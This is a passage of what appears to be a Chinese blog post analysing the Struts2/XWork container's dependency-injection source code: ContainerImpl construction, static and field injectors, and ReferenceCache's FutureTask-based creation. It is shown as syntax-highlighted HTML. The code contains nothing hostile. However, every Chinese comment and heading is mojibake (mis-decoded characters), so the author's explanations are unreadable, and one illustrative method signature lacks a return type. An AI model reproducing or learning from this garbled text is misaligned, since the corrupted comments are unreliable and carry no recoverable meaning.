class="keyword">new</span> <span class="title class_">ContainerImpl</span>.ContextualCallable&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (InternalFactory&lt;?&gt; factory : singletonFactories) &#123;</span><br><span class="line">                    <span class="comment">// å•ä¾‹çš„bean ä¸éœ€è¦æ¥æ”¶è¿”å›å€¼  å› ä¸ºåˆ›å»ºåå…¶ç›´æ¥è¢«å·¥å‚ç±»çš„instance å˜é‡å¼•ç”¨</span></span><br><span class="line">                    <span class="comment">// æ¯æ¬¡åˆ›å»ºéƒ½ä¼šç›´æ¥ä» instance å˜é‡ä¸­æ‰¾</span></span><br><span class="line">                    factory.create(context);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    container.callInContext(<span class="keyword">new</span> <span class="title class_">ContainerImpl</span>.ContextualCallable&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="comment">// æå‰åˆå§‹åŒ–çš„bean è¢«æ ‡è®°ä¸º </span></span><br><span class="line">            <span class="comment">// è¿™ç±»å‹çš„bean æœ‰ä¸ªç‰¹å®šå°±æ˜¯å®ç°äº† Initializable æ¥å£ å¹¶ä¸”ä¼šåœ¨åˆ›å»ºæ—¶è°ƒç”¨  initæ–¹æ³•</span></span><br><span class="line">            <span class="comment">// é»˜è®¤æœ‰ä¸€ä¸ªè¿™æ ·çš„beanè¢«é…ç½®  å³ DefaultConversionPropertiesProcessor   ç”¨ä½œproperties è½¬åŒ–å™¨</span></span><br><span class="line">            <span class="comment">// è¯¥ç±»ä¼šè¯»å–ä¸¤ä¸ªpropertiesé…ç½®æ–‡ä»¶å–æŸ¥æ‰¾å¯¹åº”çš„è½¬æ¢å™¨</span></span><br><span class="line">            <span class="keyword">for</span> (InternalFactory&lt;?&gt; factory : earlyInitializableFactories) &#123;</span><br><span class="line">                factory.create(context);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// å¤„ç†è¢«æ ‡æ³¨ä¸º staticçš„bean å¤„ç†å…¶é™æ€å­—æ®µä»¥åŠé™æ€æ–¹æ³•</span></span><br><span class="line">    container.injectStatics(staticInjections);</span><br><span class="line">    <span class="keyword">return</span> container;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°† åˆ›å»ºä» type åˆ° bean nameçš„ä¸å¯å˜æ˜ å°„å…³ç³» çº¿ç¨‹å®‰å…¨</span></span><br><span class="line">ContainerImpl(Map&lt;Key&lt;?&gt;, InternalFactory&lt;?&gt;&gt; factories) &#123;</span><br><span class="line">    <span class="built_in">this</span>.factories = factories;</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Key&lt;?&gt; key : factories.keySet()) &#123;</span><br><span class="line">        Set&lt;String&gt; names = map.get(key.getType());</span><br><span class="line">        <span class="keyword">if</span> (names == <span class="literal">null</span>) &#123;</span><br><span class="line">            names = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            map.put(key.getType(), names);</span><br><span class="line">        &#125;</span><br><span class="line">        names.add(key.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; entry : map.entrySet()) &#123;</span><br><span class="line">        entry.setValue(Collections.unmodifiableSet(entry.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.factoryNamesByType = Collections.unmodifiableMap(map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">injectStatics</span><span class="params">(List&lt;Class&lt;?&gt;&gt; staticInjections)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// éå†éœ€è¦è¢«æ³¨å…¥é™æ€å­—æ®µä¸æ–¹æ³•çš„bean</span></span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; clazz : staticInjections) &#123;</span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾å­—æ®µæ³¨å…¥å™¨ å¹¶æ·»åŠ åˆ°  injectors ä¸­</span></span><br><span class="line">        addInjectorsForFields(clazz.getDeclaredFields(), <span class="literal">true</span>, injectors);</span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾æ–¹æ³•æ³¨å…¥å™¨ å¹¶æ·»åŠ åˆ° injectors ä¸­</span></span><br><span class="line">        addInjectorsForMethods(clazz.getDeclaredMethods(), <span class="literal">true</span>, injectors);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è°ƒç”¨æ³¨å…¥å™¨è¿›è¡Œæ³¨å…¥</span></span><br><span class="line">    callInContext(<span class="keyword">new</span> <span class="title class_">ContextualCallable</span>&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Injector injector : injectors) &#123;</span><br><span class="line">                injector.inject(context, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥å­—æ®µæ³¨å…¥å™¨ä¸ºä¾‹å­</span></span><br><span class="line"><span class="comment">// nameå°±æ˜¯å­—æ®µçš„Injectæ³¨è§£çš„value æŒ‡å‘äº†å¦ä¸€ä¸ªbean</span></span><br><span class="line"><span class="comment">// field ä¸ºéœ€è¦æ³¨å…¥çš„å­—æ®µ</span></span><br><span class="line"><span class="comment">// containerä¸ºæ ¹å®¹å™¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FieldInjector</span><span class="params">(ContainerImpl container, Field field, String name)</span></span><br><span class="line">        <span class="keyword">throws</span> MissingDependencyException &#123;</span><br><span class="line">    <span class="built_in">this</span>.field = field;</span><br><span class="line">    <span class="keyword">if</span> ((!Modifier.isPublic(field.getModifiers()) || !Modifier.isPublic(field.getDeclaringClass().getModifiers()))</span><br><span class="line">            &amp;&amp; !field.isAccessible()) &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                sm.checkPermission(<span class="keyword">new</span> <span class="title class_">ReflectPermission</span>(<span class="string">&quot;suppressAccessChecks&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DependencyException</span>(<span class="string">&quot;Security manager in use, could not access field: &quot;</span></span><br><span class="line">                    + field.getDeclaringClass().getName() + <span class="string">&quot;(&quot;</span> + field.getName() + <span class="string">&quot;)&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ›å»ºç”¨æˆ·æ³¨å…¥çš„key</span></span><br><span class="line">    Key&lt;?&gt; key = Key.newInstance(field.getType(), name);</span><br><span class="line">    <span class="comment">// åœ¨å®¹å™¨ä¸­æŸ¥æ‰¾å¾…æ³¨å…¥çš„bean æ‰¾åˆ°çš„æ˜¯ä¸€ä¸ªfactory å†è°ƒç”¨factoryçš„createæ–¹æ³•å°±å¯ä»¥åˆ›å»ºbeanäº†</span></span><br><span class="line">    factory = container.getFactory(key);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MissingDependencyException</span>(<span class="string">&quot;No mapping found for dependency &quot;</span> + key + <span class="string">&quot; in &quot;</span> + field + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.externalContext = ExternalContext.newInstance(field, key, container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(InternalContext context, Object o)</span> &#123;</span><br><span class="line">    ExternalContext&lt;?&gt; previous = context.getExternalContext();</span><br><span class="line">    context.setExternalContext(externalContext);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ç»™å­—æ®µè®¾ç½®å€¼</span></span><br><span class="line">        <span class="comment">// å› ä¸ºæ˜¯é™æ€å­—æ®µ æ‰€ä»¥oåº”è¯¥ä¸ºnull</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨createæ–¹æ³•æŸ¥æ‰¾bean</span></span><br><span class="line">        field.set(o, factory.create(context));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        context.setExternalContext(previous);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹äºæ–¹æ³•ä¸Šçš„æ³¨å…¥å™¨æ¥è¯´</span></span><br><span class="line"><span class="comment">// é¦–å…ˆä¼šæŸ¥æ‰¾æ–¹æ³•ä¸Šæ˜¯å¦æœ‰Injectæ³¨è§£ Injectæ³¨è§£çš„valueä¸ºé»˜è®¤çš„beançš„åç§°</span></span><br><span class="line"><span class="comment">// ç„¶åå–éå†å‚æ•°  è·å¾—æ¯ä¸€ä¸ªå‚æ•°çš„ç±»å‹ç„¶å æŸ¥æ‰¾å‚æ•°æ˜¯å¦è¢«Injectæ³¨è§£ å¦‚æœæœ‰åˆ™ä½¿ç”¨è¿™ä¸ªæ³¨è§£çš„å€¼ä½œä¸º beançš„åç§°å–æŸ¥æ‰¾beanï¼Œ</span></span><br><span class="line"><span class="comment">// å¦‚æœå‚æ•°æ²¡æœ‰è¢«æ³¨è§£ åˆ™ä½¿ç”¨é»˜è®¤åç§°å–æŸ¥æ‰¾å¯¹åº”çš„beanã€‚</span></span><br><span class="line"><span class="comment">// æ–¹æ³•ä¸Šçš„Injectæ³¨è§£æ˜¯å¿…é¡»è¦æœ‰çš„</span></span><br><span class="line"><span class="meta">@Inject(&quot;default&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">methodA</span><span class="params">(<span class="meta">@Inject(&quot;id&quot;)</span> String id, Test test)</span>;</span><br><span class="line"><span class="comment">// é‡æ„è¿è¡Œæ—¶é…ç½®</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> RuntimeConfiguration <span class="title function_">buildRuntimeConfiguration</span><span class="params">()</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        Map&lt;String, Map&lt;String, ActionConfig&gt;&gt; namespaceActionConfigs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;String, String&gt; namespaceConfigs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†åŒ…é…ç½®</span></span><br><span class="line">        <span class="keyword">for</span> (PackageConfig packageConfig : packageContexts.values()) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœåŒ…é…ç½®ä¸æ˜¯æŠ½è±¡çš„</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œå€Ÿé‰´äº†é¢å‘å¯¹è±¡çš„ç†å¿µ  æŠ½è±¡åŒ…ä½œä¸ºçˆ¶åŒ…è¢«é›†æˆ ä¸ç›´æ¥å‚ä¸actionä»¥åŠbeanç­‰çš„å®šä¹‰</span></span><br><span class="line">        <span class="keyword">if</span> (!packageConfig.isAbstract()) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŒ…å‘½åç©ºé—´   æˆ‘æœªé…ç½®</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namespace</span> <span class="operator">=</span> packageConfig.getNamespace();</span><br><span class="line">        <span class="comment">// null</span></span><br><span class="line">        Map&lt;String, ActionConfig&gt; configs = namespaceActionConfigs.get(namespace);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (configs == <span class="literal">null</span>) &#123;</span><br><span class="line">        configs = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è·å–cationConfig</span></span><br><span class="line">        Map&lt;String, ActionConfig&gt; actionConfigs = packageConfig.getAllActionConfigs();</span><br><span class="line">        <span class="comment">// éå†actionConfig</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : actionConfigs.keySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">actionName</span> <span class="operator">=</span> (String) o;</span><br><span class="line">        <span class="comment">// é€šè¿‡actionnameè·å–å¯¹åº”çš„é…ç½®å¯¹è±¡</span></span><br><span class="line">        <span class="type">ActionConfig</span> <span class="variable">baseConfig</span> <span class="operator">=</span> actionConfigs.get(actionName);</span><br><span class="line">        <span class="comment">// buildFullActionConfig æ–¹æ³•è´Ÿè´£é‡æ„actionConfig ä¸»è¦æ—¶å¯¹resultä»¥åŠinterpretorçš„é‡æ„</span></span><br><span class="line">        configs.put(actionName, buildFullActionConfig(packageConfig, baseConfig));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        namespaceActionConfigs.put(namespace, configs);</span><br><span class="line">        <span class="keyword">if</span> (packageConfig.getFullDefaultActionRef() != <span class="literal">null</span>) &#123;</span><br><span class="line">        namespaceConfigs.put(namespace, packageConfig.getFullDefaultActionRef());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PatternMatcher&lt;<span class="type">int</span>[]&gt; matcher = container.getInstance(PatternMatcher.class);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">appendNamedParameters</span> <span class="operator">=</span> Boolean.parseBoolean(</span><br><span class="line">        container.getInstance(String.class, StrutsConstants.STRUTS_MATCHER_APPEND_NAMED_PARAMETERS)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RuntimeConfigurationImpl</span>(Collections.unmodifiableMap(namespaceActionConfigs),</span><br><span class="line">        Collections.unmodifiableMap(namespaceConfigs), matcher, appendNamedParameters);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h4 id="å®¹å™¨æ³¨å…¥æ–¹æ³•æ˜¯å¦‚ä½•å·¥ä½œçš„"><a href="#å®¹å™¨æ³¨å…¥æ–¹æ³•æ˜¯å¦‚ä½•å·¥ä½œçš„" class="headerlink" title="å®¹å™¨æ³¨å…¥æ–¹æ³•æ˜¯å¦‚ä½•å·¥ä½œçš„"></a>å®¹å™¨æ³¨å…¥æ–¹æ³•æ˜¯å¦‚ä½•å·¥ä½œçš„</h4><p>oæ˜¯è°ƒç”¨æ„é€ æ–¹æ³•åˆ›å»ºçš„beanå®ä¾‹ injectæ–¹æ³•è´Ÿè´£å°†è¯¥beanä¸­çš„è¢«Injectæ³¨è§£ä¿®é¥°çš„å­—æ®µæˆ–è€…æ–¹æ³•å‚æ•°æ³¨å…¥åˆ°beanå¯¹è±¡ä¸­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(<span class="keyword">final</span> Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// callInContext ä¼šå…ˆåˆ›å»ºä¸€ä¸ª InternalContext ç„¶åè°ƒç”¨callæ–¹æ³•</span></span><br><span class="line">        callInContext(<span class="keyword">new</span> <span class="title class_">ContextualCallable</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">                inject(o, context);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(Object o, InternalContext context)</span> &#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨ jnjectorsçš„getæ–¹æ³•è·å–æ–¹æ³•ä¸å­—æ®µçš„æ³¨å…¥å™¨ï¼Œç„¶åè°ƒç”¨æ³¨å…¥å™¨çš„injectæ–¹æ³•</span></span><br><span class="line">List&lt;Injector&gt; injectors = <span class="built_in">this</span>.injectors.get(o.getClass());</span><br><span class="line"><span class="keyword">for</span> (Injector injector : injectors) &#123;</span><br><span class="line">injector.inject(context, o);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jnjectorsåœ¨å®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™è¢«å®šä¹‰ </span></span><br><span class="line"><span class="comment">// å®šä¹‰äº†ä¸€ä¸ªåŒ¿åç±»å¯¹è±¡  è¯¥å¯¹è±¡ä¸º ReferenceCacheç±»å‹ </span></span><br><span class="line"><span class="comment">// é‡å†™äº†createæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt; injectors =</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReferenceCache</span>&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt;() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> List&lt;Injector&gt; <span class="title function_">create</span><span class="params">(Class&lt;?&gt; key)</span> &#123;</span><br><span class="line">        List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        addInjectors(key, injectors);</span><br><span class="line">        <span class="keyword">return</span> injectors;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰¾åˆ°å…¶getæ–¹æ³•</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(<span class="keyword">final</span> Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// å…ˆå°è¯•ä»çˆ¶ç±»ä¸­æŸ¥æ‰¾  æ‰¾ä¸åˆ°å†è°ƒç”¨ internalCreate æ–¹æ³•è¿›è¡Œåˆ›å»º</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.get(key);</span><br><span class="line">        <span class="keyword">return</span> (value == <span class="literal">null</span>) ? internalCreate((K) key) : value;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// çˆ¶ç±»çš„æŸ¥æ‰¾æ–¹æ³•</span></span><br><span class="line">        V <span class="title function_">internalGet</span><span class="params">(K key)</span> &#123;</span><br><span class="line">    <span class="comment">// delegate ä¸ºä¸€ä¸ªå¹¶å‘Mapï¼Œè¢«åˆå§‹è¯ä¸ºç©º</span></span><br><span class="line">        <span class="comment">// makeKeyReferenceAware åˆ›å»ºäº†keyçš„å¼•ç”¨ é»˜è®¤ä¸ºå¼ºå¼•ç”¨ç±»å‹</span></span><br><span class="line">        <span class="comment">// è¿™ç§Classç±»å‹çš„å¯¹è±¡ ä¼šè¢«ç»å¸¸ä½¿ç”¨æ‰€ä»¥è¢«å®šä¹‰ä¸ºå¼ºå¼•ç”¨ç±»å‹ ä¸ä¼šå†gcçš„æ—¶å€™è¢«å›æ”¶ é™¤éä¸åœ¨å­˜åœ¨å¼•ç”¨è®¡æ•°</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">valueReference</span> <span class="operator">=</span> delegate.get(makeKeyReferenceAware(key));</span><br><span class="line">        <span class="comment">// è¿”å›null</span></span><br><span class="line">        <span class="keyword">return</span> valueReference == <span class="literal">null</span> ? <span class="literal">null</span> : (V) dereferenceValue(valueReference);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// å­ç±»åˆ›å»º</span></span><br><span class="line">V <span class="title function_">internalCreate</span><span class="params">(K key)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæœªæ¥ä»»åŠ¡</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œä½¿ç”¨å¤šçº¿ç¨‹çš„å¿…è¦æ€§æ˜¯ä»€ä¹ˆ   æ•´ä¸ªåˆå§‹åŒ–è¿‡ç¨‹éƒ½æ˜¯å†å•çº¿ç¨‹çš„ç¯å¢ƒä¸­è¿è¡Œçš„  </span></span><br><span class="line">        <span class="comment">// è¿™é‡Œæè¿™ä¹ˆå¤æ‚çš„å¿…è¦æ€§æ²¡çœ‹å‡ºæ¥</span></span><br><span class="line">        <span class="comment">// ä¸”åˆ›å»ºçº¿ç¨‹ä¹Ÿæ˜¯é¢å¤–çš„å¼€é”€ </span></span><br><span class="line">        <span class="comment">// ä¸Šé¢åªè€ƒè™‘äº†åˆå§‹åŒ–è¿‡ç¨‹æ˜¯å•çº¿ç¨‹çš„ ä½†å®é™…ä½¿ç”¨æ˜¯å¹¶ä¸åªæœ‰åˆå§‹åŒ–æ—¶å‚ä¼šè°ƒç”¨åˆ°è¯¥æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// å¦‚æœæ—¶ç”¨æˆ·è§¦å‘äº†è¿™ä¸ªæ–¹æ³•åˆ™å¯èƒ½æ—¶åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ è¿™æ—¶å€™å°±è¦ä¿è¯çº¿ç¨‹å®‰å…¨</span></span><br><span class="line">        <span class="comment">// CallableCreate çš„callæ–¹æ³•æ˜¯æ ¸å¿ƒ</span></span><br><span class="line">FutureTask&lt;V&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">CallableCreate</span>(key));</span><br><span class="line"></span><br><span class="line"><span class="comment">// use a reference so we get the same equality semantics.</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">keyReference</span> <span class="operator">=</span> referenceKey(key);</span><br><span class="line"><span class="comment">// å°†ä»»åŠ¡æ”¾å…¥åˆ°çº¿ç¨‹å®‰å…¨çš„mapä¸­</span></span><br><span class="line">Future&lt;V&gt; future = futures.putIfAbsent(keyReference, futureTask);</span><br><span class="line"><span class="comment">// å¦‚æœmapä¸­æ²¡æœ‰å·²ç»å­˜åœ¨çš„futureï¼Œé‚£ä¹ˆå½“å‰çº¿ç¨‹è´Ÿè´£è°ƒç”¨è¯¥future</span></span><br><span class="line"><span class="keyword">if</span> (future == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// winning thread.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (localFuture.get() != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Nested creations within the same cache are not allowed.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// threadLocal ç±»å‹ æ¯ä¸ªçº¿ç¨‹å„ä¸€</span></span><br><span class="line">        <span class="comment">// ç”¨æ¥é¿å…é‡å¤åµŒå¥—åˆ›å»º</span></span><br><span class="line">localFuture.set(futureTask);</span><br><span class="line"><span class="comment">// è¿è¡Œtask</span></span><br><span class="line">futureTask.run();</span><br><span class="line"><span class="comment">// é˜»å¡ç­‰å¾…è·å–</span></span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> futureTask.get();</span><br><span class="line"><span class="comment">// é€šè¿‡putçš„ç­–ç•¥å°†æ³¨å…¥å™¨æ·»åŠ åˆ°å¼•ç”¨mapä¸­</span></span><br><span class="line">        <span class="comment">// ä¸‹æ¬¡è®¿é—®çš„æ—¶å€™ç›´æ¥é€šè¿‡keyReferenceè¿›è¡Œget å°±ä¸å†éœ€è¦é‡æ–°åˆ›å»ºäº†</span></span><br><span class="line">putStrategy().execute(<span class="built_in">this</span>, keyReference, referenceValue(keyReference, value));</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">localFuture.remove();</span><br><span class="line">futures.remove(keyReference);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœmapä¸­å­˜åœ¨å·²ç»å­˜åœ¨çš„futureï¼Œé‚£ä¹ˆå½“å‰çº¿ç¨‹è´Ÿè´£ç­‰å¾…è¯¥futureæ‰§è¡Œå®Œæ¯• </span></span><br><span class="line">        <span class="comment">// é¿å…é‡å¤åˆ›å»ºæ³¨å…¥å™¨</span></span><br><span class="line"><span class="comment">// wait for winning thread.</span></span><br><span class="line"><span class="keyword">return</span> future.get();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line"><span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line"><span class="keyword">if</span> (cause <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line"><span class="keyword">throw</span> (RuntimeException) cause;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line"><span class="keyword">throw</span> (Error) cause;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(cause);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// try one more time (a previous future could have come and gone.)</span></span><br><span class="line">        <span class="comment">// å†æ¬¡å°è¯•ä»ç¼“å­˜ä¸­è·å–  è¯´æ˜¯ä¸ºäº†é¿å…å…¶ä»–futureä»¥åŠæˆåŠŸåˆ›å»ºäº†æ³¨å…¥å™¨</span></span><br><span class="line">        <span class="comment">// ä½†é—®é¢˜æ˜¯è¿™ä¸ªinitè¿‡ç¨‹ä¹Ÿä¸æ˜¯å¤šçº¿ç¨‹çš„å•Šã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> internalGet(key);</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// create value.</span></span><br><span class="line">        value = create(key);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;create(K) returned null for: &quot;</span> + key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt; injectors = <span class="keyword">new</span> <span class="title class_">ReferenceCache</span>&lt;Class&lt;?&gt;, List&lt;Injector&gt;&gt;() &#123;</span><br><span class="line"><span class="keyword">protected</span> List&lt;Injector&gt; <span class="title function_">create</span><span class="params">(Class&lt;?&gt; key)</span> &#123;</span><br><span class="line">        List&lt;Injector&gt; injectors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        ContainerImpl.<span class="built_in">this</span>.addInjectors(key, injectors);</span><br><span class="line">        <span class="keyword">return</span> injectors;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å…¥å™¨çš„éƒ¨åˆ†å‰é¢æåˆ°è¿‡ è¿™é‡Œä¸å†èµ˜è¿°</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addInjectors</span><span class="params">(Class clazz, List&lt;Injector&gt; injectors)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (clazz == Object.class) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é€’å½’è°ƒç”¨  è·å–çˆ¶ç±»å­—æ®µä»¥åŠæ–¹æ³•æ³¨å…¥å™¨</span></span><br><span class="line"><span class="comment">// Add injectors for superclass 